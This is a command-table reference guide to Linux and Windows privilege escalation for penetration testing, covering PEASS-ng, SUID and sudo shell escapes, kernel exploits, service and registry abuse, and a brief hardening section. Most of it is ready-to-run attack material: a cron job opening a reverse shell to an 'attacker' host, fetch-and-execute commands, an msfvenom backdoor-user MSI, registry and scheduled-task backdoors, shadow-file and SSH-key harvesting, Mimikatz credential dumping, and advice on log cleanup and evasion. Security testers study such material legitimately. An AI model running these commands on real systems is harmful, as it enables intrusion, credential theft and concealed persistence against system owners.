
# Privilege Escalation Reference Guide

## Introduction

Privilege escalation is the process of gaining higher-level permissions on a system than initially obtained. This is a critical phase in penetration testing that allows attackers to gain administrative or root access, access sensitive data, and maintain persistence.

This comprehensive guide covers both Linux and Windows privilege escalation techniques, automated tools, manual enumeration methods, and common attack vectors used during security assessments.

## Privilege Escalation Types

### Escalation Categories

| Type | Description | Target |
|------|-------------|--------|
| `Vertical Escalation` | Gain higher privileges (user to admin/root) | Same system |
| `Horizontal Escalation` | Access another user's privileges | Same privilege level |
| `Local Escalation` | Escalate on current system | Local machine |
| `Remote Escalation` | Escalate across network | Remote systems |

### Common Attack Vectors

| Vector | Description | Example |
|--------|-------------|---------|
| `Kernel Exploits` | Exploit OS kernel vulnerabilities | CVE-2021-4034 (PwnKit) |
| `SUID/SGID Abuse` | Abuse special file permissions | `/usr/bin/find` with SUID |
| `Sudo Misconfigurations` | Exploit sudo policy weaknesses | `sudo -l` reveals dangerous commands |
| `Cron Jobs` | Abuse scheduled tasks | Writable script in cron |
| `Service Misconfigurations` | Exploit service weaknesses | Unquoted service paths |
| `Password Reuse` | Use found credentials elsewhere | Same password for multiple accounts |

## PEASS-ng - Automated Privilege Escalation Suite

### PEASS Overview

PEASS-ng (Privilege Escalation Awesome Scripts Suite) is a collection of scripts that automate the search for privilege escalation vectors on Linux and Windows systems.

| Tool | Platform | Description |
|------|----------|-------------|
| `LinPEAS` | Linux | Linux privilege escalation script |
| `WinPEAS` | Windows | Windows privilege escalation script |
| `MacPEAS` | macOS | macOS privilege escalation script |

### LinPEAS - Linux Privilege Escalation

#### Basic LinPEAS Usage

| Command | Description |
|---------|-------------|
| `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| bash` | Download and run LinPEAS |
| `./linpeas.sh` | Run basic LinPEAS scan |
| `./linpeas.sh -a` | Run all checks (verbose) |
| `./linpeas.sh -s` | Superfast scan (no network) |
| `./linpeas.sh -P` | Avoid false positives |
| `./linpeas.sh -o SysI,Devs,AvaSof` | Specific categories only |

#### LinPEAS Output Options

| Command | Description |
|---------|-------------|
| `./linpeas.sh > linpeas_output.txt` | Save output to file |
| `./linpeas.sh \| tee linpeas_output.txt` | Display and save output |
| `./linpeas.sh -q` | Quiet mode (less output) |
| `./linpeas.sh -N` | Do not use colors |

#### LinPEAS Advanced Usage

| Command | Description |
|---------|-------------|
| `./linpeas.sh -L 1` | Level 1 scan (basic) |
| `./linpeas.sh -L 2` | Level 2 scan (detailed) |
| `./linpeas.sh -M` | Avoid mount points |
| `./linpeas.sh -d /tmp` | Change temp directory |
| `./linpeas.sh -p /usr/bin/pass` | Password in environment variables |
| `./linpeas.sh -r` | Execute from memory (stealthier) |

### WinPEAS - Windows Privilege Escalation

#### Basic WinPEAS Usage

| Command | Description |
|---------|-------------|
| `winpeas.exe` | Run basic WinPEAS scan |
| `winpeas.exe systeminfo` | System information only |
| `winpeas.exe userinfo` | User information only |
| `winpeas.exe filesinfo` | File system information |
| `winpeas.exe servicesinfo` | Services information |
| `winpeas.exe applicationsinfo` | Applications information |

#### WinPEAS Output Control

| Command | Description |
|---------|-------------|
| `winpeas.exe > output.txt` | Save output to file |
| `winpeas.exe log` | Save to winpeas.log |
| `winpeas.exe quiet` | Reduced output |
| `winpeas.exe notcolor` | No colored output |

#### WinPEAS Advanced Options

| Command | Description |
|---------|-------------|
| `winpeas.exe fast` | Fast scan (skip some checks) |
| `winpeas.exe searchfast` | Fast file search |
| `winpeas.exe cmd` | Check common commands |
| `winpeas.exe domain` | Domain enumeration |

### PEASS Remote Execution

| Method | Command | Description |
|--------|---------|-------------|
| `curl + bash` | `curl -L https://github.com/.../linpeas.sh \| bash` | Direct execution |
| `wget + bash` | `wget -q -O - https://github.com/.../linpeas.sh \| bash` | Alternative download |
| `Python server` | `python3 -m http.server 8000` | Serve from attacker machine |
| `PowerShell` | `IEX(New-Object Net.WebClient).downloadString('http://ip/winpeas.ps1')` | PowerShell execution |

## Linux Privilege Escalation

### Manual Enumeration Commands

#### System Information

| Command | Description |
|---------|-------------|
| `uname -a` | Kernel version and system info |
| `cat /proc/version` | Kernel version details |
| `cat /etc/os-release` | Operating system information |
| `lscpu` | CPU information |
| `free -h` | Memory information |
| `df -h` | Disk space usage |
| `mount` | Mounted filesystems |
| `lsblk` | Block devices |

#### User and Group Information

| Command | Description |
|---------|-------------|
| `whoami` | Current username |
| `id` | Current user ID and groups |
| `cat /etc/passwd` | All system users |
| `cat /etc/group` | All system groups |
| `w` | Currently logged users |
| `last` | Login history |
| `sudo -l` | Sudo privileges |
| `cat /etc/sudoers` | Sudoers configuration |

#### Network Information

| Command | Description |
|---------|-------------|
| `ip a` | Network interfaces |
| `netstat -tuln` | Listening ports |
| `ss -tuln` | Socket statistics |
| `arp -a` | ARP table |
| `cat /etc/hosts` | Hosts file |
| `cat /etc/resolv.conf` | DNS configuration |

### SUID/SGID Exploitation

#### Finding SUID/SGID Files

| Command | Description |
|---------|-------------|
| `find / -perm -4000 -type f 2>/dev/null` | Find SUID files |
| `find / -perm -2000 -type f 2>/dev/null` | Find SGID files |
| `find / -perm -6000 -type f 2>/dev/null` | Find SUID and SGID files |
| `find / -perm -u=s -type f 2>/dev/null` | Alternative SUID search |

#### Common SUID Exploits

| Binary | Exploitation Method | Example |
|--------|-------------------|---------|
| `find` | Execute commands | `find /home -exec /bin/bash -p \;` |
| `vim` | Shell escape | `:!/bin/bash` |
| `nmap` | Interactive mode | `nmap --interactive; !bash` |
| `awk` | Execute commands | `awk 'BEGIN {system("/bin/bash")}'` |
| `python` | Import os | `python -c "import os; os.system('/bin/bash')"` |

### Sudo Exploitation

#### Sudo Enumeration

| Command | Description |
|---------|-------------|
| `sudo -l` | List sudo privileges |
| `sudo -ll` | Long format sudo list |
| `cat /etc/sudoers` | View sudoers file |
| `grep -r "NOPASSWD" /etc/sudoers*` | Find NOPASSWD entries |

#### Common Sudo Exploits

| Sudo Entry | Exploitation | Example |
|------------|-------------|---------|
| `(ALL) NOPASSWD: /bin/vim` | Vim shell escape | `sudo vim -c ':!/bin/bash'` |
| `(ALL) NOPASSWD: /usr/bin/find` | Find command execution | `sudo find /etc -exec /bin/bash \;` |
| `(ALL) NOPASSWD: /usr/bin/awk` | AWK command execution | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| `(ALL) NOPASSWD: /usr/bin/python*` | Python execution | `sudo python -c "import os;os.system('/bin/bash')"` |

### Cron Job Exploitation

#### Cron Enumeration

| Command | Description |
|---------|-------------|
| `cat /etc/crontab` | System crontab |
| `ls -la /etc/cron.*` | Cron directories |
| `crontab -l` | User crontab |
| `grep -r "* * * * *" /var/spool/cron/` | All user crontabs |
| `pspy64` | Monitor running processes |

#### Cron Exploitation Techniques

| Technique | Description | Example |
|-----------|-------------|---------|
| `Writable script` | Modify executed script | Edit script to spawn reverse shell |
| `PATH hijacking` | Create malicious binary in PATH | Create fake `tar` in `/tmp` |
| `Wildcard injection` | Exploit wildcard usage | `tar cf /dev/null *` exploitation |

### Kernel Exploits

#### Kernel Version Check

| Command | Description |
|---------|-------------|
| `uname -r` | Kernel release |
| `cat /proc/version` | Detailed kernel info |
| `searchsploit kernel ubuntu` | Search for kernel exploits |
| `linux-exploit-suggester.sh` | Automated exploit suggestion |

#### Common Linux Kernel Exploits

| CVE | Name | Affected Versions | Description |
|-----|------|------------------|-------------|
| `CVE-2021-4034` | PwnKit | Most distributions | Polkit privilege escalation |
| `CVE-2022-0847` | Dirty Pipe | 5.8+ | Write to read-only files |
| `CVE-2016-5195` | Dirty COW | 2.6.22 - 4.8.3 | Copy-on-write race condition |
| `CVE-2017-16995` | eBPF | 4.4 - 4.14.11 | BPF privilege escalation |

### File Permission Exploitation

#### World-Writable Files

| Command | Description |
|---------|-------------|
| `find / -writable -type f 2>/dev/null \| grep -v proc` | Find writable files |
| `find / -perm -2 -type f 2>/dev/null` | World-writable files |
| `find /etc -writable -type f 2>/dev/null` | Writable files in /etc |

#### Interesting Files and Directories

| Location | Description | Commands |
|----------|-------------|----------|
| `/etc/passwd` | User accounts | `ls -la /etc/passwd` |
| `/etc/shadow` | Password hashes | `ls -la /etc/shadow` |
| `/root/.ssh/` | SSH keys | `find /root -name "*.ssh*" 2>/dev/null` |
| `/home/*/.ssh/` | User SSH keys | `find /home -name "*.ssh*" 2>/dev/null` |
| `/var/www/html/` | Web files | `find /var/www -name "config*" 2>/dev/null` |

## Windows Privilege Escalation

### Manual Windows Enumeration

#### System Information

| Command | Description |
|---------|-------------|
| `systeminfo` | Detailed system information |
| `hostname` | Computer name |
| `echo %USERNAME%` | Current username |
| `whoami /priv` | Current user privileges |
| `whoami /groups` | Current user groups |
| `net user` | List all users |
| `net localgroup` | List all groups |
| `net localgroup administrators` | Administrators group members |

#### Network Information

| Command | Description |
|---------|-------------|
| `ipconfig /all` | Network configuration |
| `netstat -ano` | Active connections |
| `arp -a` | ARP table |
| `route print` | Routing table |
| `netsh firewall show state` | Firewall status |

#### Service Information

| Command | Description |
|---------|-------------|
| `sc query` | List all services |
| `wmic service list brief` | Service details |
| `net start` | Started services |
| `tasklist /svc` | Running processes with services |

### Windows Service Exploitation

#### Service Enumeration

| Command | Description |
|---------|-------------|
| `sc qc "servicename"` | Service configuration |
| `wmic service get name,displayname,pathname,startmode` | Service paths |
| `accesschk.exe -uwcqv "Authenticated Users" *` | Service permissions |
| `PowerUp.ps1; Invoke-AllChecks` | PowerUp service checks |

#### Unquoted Service Path Exploitation

| Command | Description |
|---------|-------------|
| `wmic service get name,displayname,pathname \| findstr /i "C:\\"` | Find unquoted paths |
| `accesschk.exe -uwdq "C:\Program Files\"` | Check directory permissions |
| `copy payload.exe "C:\Program Files\Common Files\service.exe"` | Place malicious executable |

### Registry Exploitation

#### Registry Enumeration

| Command | Description |
|---------|-------------|
| `reg query HKLM /f password /t REG_SZ /s` | Search for passwords |
| `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"` | Autologon credentials |
| `reg query HKLM /f "password" /t REG_SZ /s` | Password search |

#### AlwaysInstallElevated

| Command | Description |
|---------|-------------|
| `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` | Check user setting |
| `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` | Check machine setting |
| `msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi > backdoor.msi` | Create MSI payload |
| `msiexec /quiet /qn /i backdoor.msi` | Execute MSI |

### Windows Credential Hunting

#### Credential Locations

| Location | Description | Command |
|----------|-------------|---------|
| `Registry` | Stored credentials | `reg query HKLM /f password /t REG_SZ /s` |
| `Files` | Configuration files | `findstr /si password *.txt *.xml *.config` |
| `Memory` | Process memory | `mimikatz.exe` |
| `SAM/SYSTEM` | Password hashes | `samdump2 SYSTEM SAM` |

#### Mimikatz Usage

| Command | Description |
|---------|-------------|
| `privilege::debug` | Enable debug privilege |
| `sekurlsa::logonpasswords` | Extract plaintext passwords |
| `sekurlsa::wdigest` | WDigest passwords |
| `sekurlsa::kerberos` | Kerberos tickets |
| `lsadump::sam` | Dump SAM database |
| `lsadump::secrets` | Dump LSA secrets |

## Automated Enumeration Tools

### Linux Enumeration Scripts

| Tool | Command | Description |
|------|---------|-------------|
| `LinEnum` | `./LinEnum.sh` | Comprehensive Linux enumeration |
| `linux-smart-enumeration` | `./lse.sh` | Smart Linux enumeration |
| `linux-exploit-suggester` | `./linux-exploit-suggester.sh` | Kernel exploit suggestions |
| `LinuxPrivChecker` | `python linuxprivchecker.py` | Python-based enumeration |

### Windows Enumeration Tools

| Tool | Command | Description |
|------|---------|-------------|
| `PowerUp` | `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"` | PowerShell privilege escalation |
| `Sherlock` | `powershell -ep bypass -c ". .\Sherlock.ps1; Find-AllVulns"` | Vulnerability scanner |
| `Watson` | `Watson.exe` | .NET vulnerability scanner |
| `Seatbelt` | `Seatbelt.exe -group=all` | Security-focused enumeration |

### Cross-Platform Tools

| Tool | Platform | Description |
|------|----------|-------------|
| `PEASS-ng` | Linux/Windows/macOS | Comprehensive privilege escalation |
| `BeRoot` | Linux/Windows | Automated root detection |
| `GTFOBins` | Linux | Binary exploitation database |
| `LOLBAS` | Windows | Living off the land binaries |

## Post-Exploitation Techniques

### Persistence Mechanisms

#### Linux Persistence

| Method | Command | Description |
|--------|---------|-------------|
| `SSH Keys` | `echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys` | Add SSH key |
| `Cron Jobs` | `(crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'") \| crontab -` | Reverse shell cron |
| `Systemd Service` | Create malicious service file | Persistent service |
| `Bashrc` | `echo "payload" >> ~/.bashrc` | Login trigger |

#### Windows Persistence

| Method | Command | Description |
|--------|---------|-------------|
| `Registry Run Key` | `reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\backdoor.exe"` | Startup persistence |
| `Scheduled Task` | `schtasks /create /sc onlogon /tn "backdoor" /tr "C:\backdoor.exe"` | Task scheduler |
| `Service` | `sc create backdoor binPath= "C:\backdoor.exe"` | Windows service |
| `WMI Event` | WMI event subscription | Advanced persistence |

### Credential Dumping

#### Linux Credentials

| Method | Command | Description |
|--------|---------|-------------|
| `Shadow File` | `sudo cat /etc/shadow` | Password hashes |
| `SSH Keys` | `find / -name "id_rsa*" 2>/dev/null` | Private SSH keys |
| `History Files` | `cat ~/.bash_history` | Command history |
| `Config Files` | `grep -r "password" /etc/` | Configuration passwords |

#### Windows Credentials

| Method | Tool | Description |
|--------|------|-------------|
| `LSASS Dump` | `mimikatz` | Live credential extraction |
| `SAM Database` | `samdump2` | Offline hash extraction |
| `Registry Hives` | `reg save` | Export registry hives |
| `DPAPI` | `mimikatz` | Decrypt stored credentials |

## Detection Evasion

### Anti-Detection Techniques

| Technique | Description | Example |
|-----------|-------------|---------|
| `Living off the Land` | Use built-in tools | PowerShell, WMI, certutil |
| `Memory Execution` | Run payloads from memory | PowerShell reflective loading |
| `Process Hollowing` | Inject into legitimate processes | Replace process memory |
| `Timestomp` | Modify file timestamps | Hide file creation times |

### Stealth Considerations

| Aspect | Recommendation |
|--------|----------------|
| `Log Cleanup` | Remove traces from logs |
| `Process Names` | Use legitimate-looking names |
| `Network Traffic` | Use encrypted channels |
| `File Locations` | Hide in system directories |
| `Timing` | Avoid detection windows |

## Remediation and Hardening

### Linux Hardening

| Technique | Implementation |
|-----------|----------------|
| `Remove SUID` | `chmod u-s /path/to/binary` |
| `Sudo Restrictions` | Limit sudo access in sudoers |
| `Kernel Updates` | Regular security patches |
| `File Permissions` | Proper permission settings |
| `Service Hardening` | Disable unnecessary services |

### Windows Hardening

| Technique | Implementation |
|-----------|----------------|
| `Service Permissions` | Restrict service modifications |
| `Registry Security` | Limit registry access |
| `UAC` | Enable User Account Control |
| `LAPS` | Local Administrator Password Solution |
| `Credential Guard` | Windows Defender Credential Guard |

This comprehensive privilege escalation guide provides essential techniques and tools for security testing and assessment during penetration testing engagements, with detailed PEASS usage and extensive manual enumeration methods.